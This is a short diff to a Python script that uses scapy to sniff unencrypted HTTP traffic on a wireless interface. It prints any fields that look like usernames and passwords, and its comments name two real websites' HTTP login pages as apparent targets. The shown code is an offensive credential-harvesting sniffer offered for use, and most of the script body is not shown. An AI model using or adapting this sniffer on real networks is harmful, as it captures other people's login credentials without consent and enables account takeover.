@@ -1,5 +1,9 @@
 #To check packets data in terminal in http protocol not on httpS
 #!usr/bin/env python
+#pip install scapy_http
+#ifconfig
+# http://learnersdictionary.com/auth/login
+# http://www.businessdictionary.com/login.php
 import scapy.all as scapy
 from scapy.layers.http import HTTPRequest
 
@@ -35,4 +39,4 @@ def process_sniffed_packet(packet):
         if login_info:
             print("\n\n[+] Possible username/password > " + login_info + "\n\n")
 
-sniff("wlp1s0")
+sniff("wlan0")
